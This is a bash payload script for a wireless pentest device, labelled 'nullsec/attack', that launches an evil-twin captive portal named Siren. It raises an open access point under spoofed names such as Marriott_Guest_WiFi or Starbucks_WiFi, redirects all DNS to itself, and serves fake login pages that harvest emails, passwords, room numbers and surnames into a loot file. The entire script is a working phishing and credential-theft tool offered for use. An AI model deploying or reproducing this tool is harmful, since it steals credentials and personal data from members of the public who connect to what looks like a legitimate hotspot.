#!/bin/bash
# Title: Siren - Social Infrastructure Reconnaissance
# Author: bad-antics
# Description: Advanced captive portal with multiple lures
# Category: nullsec/attack

LOOT_DIR="/mmc/nullsec/siren"
PORTAL_DIR="/tmp/siren_portal"
mkdir -p "$LOOT_DIR" "$PORTAL_DIR"

PROMPT "SIREN - THE WIRELESS LURE

Advanced captive portal with
themed login pages.

Songs:
1. Hotel WiFi
2. Airport Free
3. Coffee Shop
4. Social Login
5. Corporate Guest

Press OK to configure."

PROMPT "CHOOSE YOUR SONG:

1. Hotel WiFi
2. Airport Free
3. Coffee Shop
4. Social Login
5. Corporate Guest
6. Free Premium WiFi

Select on next screen."

SONG=$(NUMBER_PICKER "Song (1-6):" 1)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) SONG=1 ;; esac

case $SONG in
    1) SSID="Marriott_Guest_WiFi"; PORTAL_TYPE="hotel" ;;
    2) SSID="Airport_Free_WiFi"; PORTAL_TYPE="airport" ;;
    3) SSID="Starbucks_WiFi"; PORTAL_TYPE="coffee" ;;
    4) SSID="Free_WiFi_Social"; PORTAL_TYPE="social" ;;
    5) SSID="GUEST-NETWORK"; PORTAL_TYPE="corporate" ;;
    6) SSID="FREE_PREMIUM_WIFI"; PORTAL_TYPE="premium" ;;
esac

CUSTOM_SSID=$(TEXT_PICKER "SSID (or keep default):" "$SSID")
[ -n "$CUSTOM_SSID" ] && SSID="$CUSTOM_SSID"

DURATION=$(NUMBER_PICKER "Duration (minutes):" 30)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) DURATION=30 ;; esac
DURATION_SEC=$((DURATION * 60))

resp=$(CONFIRMATION_DIALOG "DEPLOY SIREN?

SSID: $SSID
Portal: $PORTAL_TYPE
Duration: ${DURATION} min

Press OK to deploy.")
[ "$resp" != "$DUCKYSCRIPT_USER_CONFIRMED" ] && exit 0

LOOT_FILE="$LOOT_DIR/siren_$(date +%Y%m%d_%H%M).txt"
echo "SIREN Credentials - $(date) - SSID: $SSID" > "$LOOT_FILE"

# Create portal based on type
case $PORTAL_TYPE in
    hotel)
        cat > "$PORTAL_DIR/index.html" << 'PHTML'
<!DOCTYPE html><html><head><title>Hotel Guest WiFi</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<style>body{font-family:Arial;background:#1a1a2e;color:#fff;margin:0;padding:20px}.c{max-width:400px;margin:0 auto;background:#16213e;padding:30px;border-radius:10px}h1{color:#e94560;text-align:center}input{width:100%;padding:12px;margin:10px 0;border:none;border-radius:5px;box-sizing:border-box}button{width:100%;padding:15px;background:#e94560;color:#fff;border:none;border-radius:5px}</style>
</head><body><div class="c"><h1>Hotel Guest WiFi</h1>
<p>Enter room details to connect</p>
<form action="/capture.php" method="POST">
<input name="room" placeholder="Room Number" required>
<input name="lastname" placeholder="Last Name" required>
<input name="email" type="email" placeholder="Email" required>
<button type="submit">Connect</button></form></div></body></html>
PHTML
        ;;
    social)
        cat > "$PORTAL_DIR/index.html" << 'PHTML'
<!DOCTYPE html><html><head><title>Free WiFi - Login</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<style>body{font-family:Arial;background:#0f0f0f;color:#fff;margin:0;padding:20px}.c{max-width:400px;margin:0 auto;background:#1a1a1a;padding:30px;border-radius:10px}input{width:100%;padding:12px;margin:10px 0;border:none;border-radius:5px;box-sizing:border-box}button{width:100%;padding:15px;margin:5px 0;border:none;border-radius:5px;font-size:16px}.fb{background:#1877f2;color:#fff}</style>
</head><body><div class="c"><h1>Free WiFi</h1><p>Sign in to connect</p>
<form action="/capture.php" method="POST">
<input name="email" type="email" placeholder="Email" required>
<input name="password" type="password" placeholder="Password" required>
<button class="fb" type="submit">Sign In</button></form></div></body></html>
PHTML
        ;;
    *)
        cat > "$PORTAL_DIR/index.html" << 'PHTML'
<!DOCTYPE html><html><head><title>Free WiFi</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<style>body{font-family:Arial;background:#121212;color:#fff;margin:0;padding:20px}.c{max-width:400px;margin:0 auto;background:#1e1e1e;padding:30px;border-radius:10px}h1{text-align:center}input{width:100%;padding:12px;margin:10px 0;border:none;border-radius:5px;box-sizing:border-box}button{width:100%;padding:15px;background:#4CAF50;color:#fff;border:none;border-radius:5px}</style>
</head><body><div class="c"><h1>Free WiFi Access</h1>
<form action="/capture.php" method="POST">
<input name="email" type="email" placeholder="Email" required>
<input name="password" type="password" placeholder="Password" required>
<button type="submit">Connect</button></form></div></body></html>
PHTML
        ;;
esac

# PHP capture script (properly reads POST data)
cat > "$PORTAL_DIR/capture.php" << CAPEOF
<?php
\$log = "$LOOT_FILE";
\$ts = date("Y-m-d H:i:s");
\$ip = \$_SERVER['REMOTE_ADDR'];
\$data = "";
foreach (\$_POST as \$k => \$v) { \$data .= "\$k=\$v "; }
file_put_contents(\$log, "[\$ts] IP:\$ip \$data\n", FILE_APPEND);
header("Location: /success.html");
?>
CAPEOF

cat > "$PORTAL_DIR/success.html" << 'SHTML'
<!DOCTYPE html><html><head><title>Connected!</title>
<style>body{font-family:Arial;background:#1a1a1a;color:#fff;text-align:center;padding:50px}h1{color:#4CAF50}</style>
</head><body><h1>✓ Connected!</h1><p>You now have internet access.</p></body></html>
SHTML

LOG "Deploying Siren..."

killall hostapd dnsmasq php 2>/dev/null
AP_IF="wlan1"
airmon-ng stop wlan1mon 2>/dev/null
sleep 1

cat > /tmp/siren_hostapd.conf << EOF
interface=$AP_IF
driver=nl80211
ssid=$SSID
channel=6
hw_mode=g
auth_algs=1
wpa=0
EOF

hostapd /tmp/siren_hostapd.conf -B 2>/dev/null
sleep 2
ifconfig $AP_IF 192.168.4.1 netmask 255.255.255.0 up

cat > /tmp/siren_dnsmasq.conf << EOF
interface=$AP_IF
bind-interfaces
dhcp-range=192.168.4.2,192.168.4.100,255.255.255.0,12h
address=/#/192.168.4.1
EOF
dnsmasq -C /tmp/siren_dnsmasq.conf 2>/dev/null

cd "$PORTAL_DIR"
php -S 192.168.4.1:80 2>/dev/null &

LOG "Siren active: $SSID ($PORTAL_TYPE)"

sleep "$DURATION_SEC"

killall hostapd dnsmasq php 2>/dev/null
rm -rf "$PORTAL_DIR" /tmp/siren_*.conf
airmon-ng start wlan1 2>/dev/null

CAPTURES=$(grep -c "IP:" "$LOOT_FILE" 2>/dev/null || echo 0)

PROMPT "SIREN SILENCED

SSID: $SSID
Portal: $PORTAL_TYPE
Duration: ${DURATION} min
Captures: $CAPTURES
Log: $LOOT_FILE

Press OK to exit."
